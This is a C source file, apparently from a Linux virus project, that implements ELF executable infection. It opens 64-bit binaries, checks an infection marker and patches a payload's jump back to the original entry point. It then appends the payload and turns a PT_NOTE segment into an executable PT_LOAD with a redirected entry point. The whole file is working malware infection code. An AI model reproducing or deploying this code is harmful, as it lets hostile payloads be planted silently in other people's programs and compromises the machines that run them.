#include "infection.h"
#include "../debug/debug.h"

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/stat.h>
#include <elf.h>
#include <string.h>

static int open_and_map(char *file, int *fd, struct stat *st, char **map) {
    *fd = open(file, O_RDWR);
    if (*fd < 0) {
        LOG_PERROR("open failed.");
        return 1;
    }

    if (fstat(*fd, st) != 0) {
        LOG_PERROR("fstat failed.");
        return 1;
    }

    *map = mmap(NULL, st->st_size, PROT_READ | PROT_WRITE, MAP_SHARED, *fd, 0);
    if (*map == MAP_FAILED) {
        LOG_PERROR("mmap failed.");
        return 1;
    }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)(*map);
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0 ||
        ehdr->e_ident[EI_MAG1] != ELFMAG1 ||
        ehdr->e_ident[EI_MAG2] != ELFMAG2 ||
        ehdr->e_ident[EI_MAG3] != ELFMAG3 ||
        ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        LOG_DEBUG("File isn't a 64-bit ELF.");
        return 1;
    }

    if (ehdr->e_version == 0x1444) {
        LOG_DEBUG("File already infected.");
        return 1;
    }

    return 0;
}

static Elf64_Addr calc_new_entry_point(char *map) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
    Elf64_Addr max_addr = 0;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type != PT_LOAD)
            continue;

        Elf64_Addr end = phdr[i].p_vaddr + phdr[i].p_memsz;
        if (end > max_addr)
            max_addr = end;
    }
    Elf64_Addr new_entry = (max_addr + 0xFFF) & ~0xFFF;
    return new_entry;
}

static int patch_payload(char *map, Elf64_Addr new_entry, unsigned char *payload, size_t payload_size) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;

    for (size_t jmp_offset = 0; jmp_offset < payload_size - 4; jmp_offset++) {
        unsigned int value;
        memcpy(&value, payload + jmp_offset + 1, 4);
        if (payload[jmp_offset] != 0xE9 || value != 0x11111111) // find jmp offset
            continue;

        unsigned int entry_offset = ehdr->e_entry - new_entry - jmp_offset - 5;
        memcpy(payload + jmp_offset + 1, &entry_offset, 4);
        return 0;
    }
    LOG_DEBUG("jump offset not found.");
    return 1;
}

static int write_payload(int fd, unsigned char *payload, size_t payload_size, off_t payload_offset) {
    if (lseek(fd, payload_offset, SEEK_SET) == -1) {
        LOG_PERROR("lseek failed");
        return 1;
    }

    ssize_t written = write(fd, payload, payload_size);
    if (written != (ssize_t)payload_size) {
        LOG_PERROR("write failed");
        return 1;
    }
    if (ftruncate(fd, payload_offset + payload_size) == -1) {
        LOG_PERROR("ftruncate failed");
        return 1;
    }
    if (fsync(fd) == -1)
        LOG_PERROR("fsync warning (non-critical)");
    return 0;
}

static int ptnote_to_ptload(char *map, size_t payload_size, Elf64_Addr new_entry, off_t payload_offset) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
    int i = 0;

    while (i < ehdr->e_phnum && phdr[i].p_type != PT_NOTE)
        i++;

    if (i == ehdr->e_phnum) {
        LOG_DEBUG("No PT_NOTE segment found.");
        return 1;
    }

    ehdr->e_entry = new_entry;
    ehdr->e_version = 0x1444;

    phdr[i].p_type = PT_LOAD;
    phdr[i].p_flags = PF_R | PF_X;
    phdr[i].p_vaddr = new_entry;
    phdr[i].p_paddr = new_entry;
    phdr[i].p_offset = payload_offset;
    phdr[i].p_filesz = payload_size;
    phdr[i].p_memsz = payload_size + 0x100000;
    phdr[i].p_align = 0x1000;
    return 0;
}

int infect_ptnote(char *target_filename, unsigned char *payload, size_t payload_size) {
    int ret = 0;

    int fd = -1;
    struct stat *st = malloc(sizeof(struct stat));
    char *map = NULL;

    // 1. Open the ELF file to be injected
    if (open_and_map(target_filename, &fd, st, &map) != 0) {
        LOG_DEBUG("open_and_map_elf failed.");
        ret = 1;
        goto Error;
    }

    // 2. Change the entry point address to an area that will not conflict with the
    //    original program execution.
    Elf64_Addr new_entry = calc_new_entry_point(map);
    off_t payload_offset = (st->st_size + 0xFFF) & ~0xFFF;

    // 3. Patch payload
    if (patch_payload(map, new_entry, payload, payload_size) != 0) {
        LOG_DEBUG("patch_payload failed.");
        ret = 1;
        goto Error;
    }

    // 4. Add our injected code to the end of the file
    if (write_payload(fd, payload, payload_size, payload_offset) != 0) {
        LOG_DEBUG("write_payload failed.");
        ret = 1;
        goto Error;
    }

    // 5. Convert PT_NOTE to PT_LOAD
    if (ptnote_to_ptload(map, payload_size, new_entry, payload_offset) != 0) {
        LOG_DEBUG("infect_ptnote failed.");
        ret = 1;
        goto Error;
    }

    LOG_DEBUG("Injection successful in %s\n", target_filename);
Error:
    if (fd >= 0) close(fd);
    if (map != NULL && map != MAP_FAILED) munmap(map, st->st_size);
    free(st);
    return ret;
}
